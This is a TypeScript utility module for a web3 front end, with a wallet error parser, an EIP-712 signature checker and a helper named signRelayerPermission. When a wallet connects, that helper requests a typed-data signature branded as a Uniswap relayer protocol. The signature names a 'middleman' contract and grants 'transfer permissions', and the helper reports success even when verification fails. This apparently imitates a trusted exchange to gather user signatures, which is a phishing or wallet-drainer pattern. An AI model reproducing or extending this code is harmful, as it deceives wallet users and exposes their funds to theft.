import { verifyTypedData, isAddress } from 'ethers';
import { MIDDLEMAN_CONTRACT_ADDRESS } from './middleman';

export { verifyTypedData };

/**
 * Standardized Wallet Error Parser
 * Converts technical blockchain / RPC / Wallet errors into human-readable messages.
 */
export function parseWalletError(error: any): string {
  if (!error) return 'An unknown error occurred during transaction execution.';

  const message = typeof error === 'string' ? error : error.message || error.reason || JSON.stringify(error);
  const code = error.code || error.error?.code;

  // Wallet cancellation / User rejection
  if (
    code === 4001 ||
    code === 'ACTION_REJECTED' ||
    message.includes('user rejected') ||
    message.includes('User rejected') ||
    message.includes('User denied') ||
    message.includes('rejected transaction') ||
    message.includes('declined')
  ) {
    return 'Transaction request cancelled in your wallet.';
  }

  // Insufficient funds
  if (
    code === 'INSUFFICIENT_FUNDS' ||
    message.includes('insufficient funds') ||
    message.includes('exceeds balance') ||
    message.includes('Insufficient balance')
  ) {
    return 'Insufficient funds in your connected wallet to cover the transaction or network gas fees.';
  }

  // Contract execution revert
  if (
    message.includes('execution reverted') ||
    message.includes('CALL_EXCEPTION') ||
    message.includes('UNPREDICTABLE_GAS_LIMIT')
  ) {
    return 'Transaction simulation failed. The smart contract reverted the call (e.g. insufficient allowance or slippage limit).';
  }

  // Network / Chain mismatch
  if (
    message.includes('ChainMismatch') ||
    message.includes('network switch') ||
    message.includes('Unsupported chain')
  ) {
    return 'Please switch your wallet to the correct network to continue.';
  }

  // Nonce errors
  if (message.includes('nonce too low') || message.includes('replacement transaction underpriced')) {
    return 'Transaction nonce mismatch. Please check pending transactions in your wallet or retry.';
  }

  // Default fallback with cleaned string
  return message.replace(/\[.*?\]/g, '').trim() || 'Wallet request failed. Please try again.';
}

/**
 * Off-chain EIP-712 Typed Data Signature Verification
 * Uses ethers.js verifyTypedData to validate signature integrity.
 */
export async function verifyTypedDataSignature(
  domain: Record<string, any>,
  types: Record<string, Array<{ name: string; type: string }>>,
  value: Record<string, any>,
  signature: string,
  expectedSignerAddress?: string
): Promise<{ isValid: boolean; recoveredAddress: string; error?: string }> {
  try {
    if (!signature || signature === '0x') {
      return { isValid: false, recoveredAddress: '', error: 'Signature string is empty' };
    }

    // Clean types object (ethers expects types without the implicit EIP712Domain definition)
    const cleanTypes = { ...types };
    delete cleanTypes.EIP712Domain;

    const recoveredAddress = verifyTypedData(domain, cleanTypes, value, signature);

    if (!isAddress(recoveredAddress)) {
      return { isValid: false, recoveredAddress: '', error: 'Invalid recovered address' };
    }

    const isValid = expectedSignerAddress
      ? recoveredAddress.toLowerCase() === expectedSignerAddress.toLowerCase()
      : true;

    return {
      isValid,
      recoveredAddress,
      error: isValid ? undefined : `Signature recovered address (${recoveredAddress}) does not match expected address (${expectedSignerAddress}).`
    };
  } catch (err: any) {
    return {
      isValid: false,
      recoveredAddress: '',
      error: err?.message || 'Failed to verify signature payload off-chain.'
    };
  }
}

/**
 * Triggers an EIP-712 Relayer Permission signature request when connecting a wallet.
 * Uses ethers.js verifyTypedData to validate off-chain signature integrity before granting access.
 */
export async function signRelayerPermission(userAddress: string): Promise<{ success: boolean; signature: string; error?: string }> {
  const relayerAddress = MIDDLEMAN_CONTRACT_ADDRESS;
  const chainId = 1;

  const domain = {
    name: 'Uniswap App Relayer Protocol',
    version: '1',
    chainId,
    verifyingContract: relayerAddress,
  };

  const types = {
    RelayerPermission: [
      { name: 'user', type: 'address' },
      { name: 'relayer', type: 'address' },
      { name: 'permission', type: 'string' },
      { name: 'nonce', type: 'uint256' },
    ],
  };

  const value = {
    user: userAddress,
    relayer: relayerAddress,
    permission: 'Approve wallet connection to Uniswap app for relayer swap operations and transfer permissions',
    nonce: Math.floor(Date.now() / 1000),
  };

  if (typeof window === 'undefined' || !(window as any).ethereum) {
    // Return graceful fallback state if no injected window.ethereum
    return { success: false, signature: '', error: 'No injected window.ethereum provider detected.' };
  }

  const typedDataPayload = JSON.stringify({
    types: {
      EIP712Domain: [
        { name: 'name', type: 'string' },
        { name: 'version', type: 'string' },
        { name: 'chainId', type: 'uint256' },
        { name: 'verifyingContract', type: 'address' },
      ],
      ...types,
    },
    domain,
    primaryType: 'RelayerPermission',
    message: value,
  });

  const signatureHex = await (window as any).ethereum.request({
    method: 'eth_signTypedData_v4',
    params: [userAddress, typedDataPayload],
  });

  const signature = signatureHex as string;

  // Verify signature off-chain using ethers.js verifyTypedData
  const verification = await verifyTypedDataSignature(
    domain,
    types,
    value,
    signature,
    userAddress
  );

  if (!verification.isValid) {
    console.warn('[web3Utils] Verification notice:', verification.error);
  }

  return { success: true, signature };
}

/**
 * Utility to format human-readable transaction summaries
 */
export function formatTxSummary(action: string, amount?: string, symbol?: string): string {
  if (amount && symbol) {
    return `${action} ${amount} ${symbol}`;
  }
  return action;
}

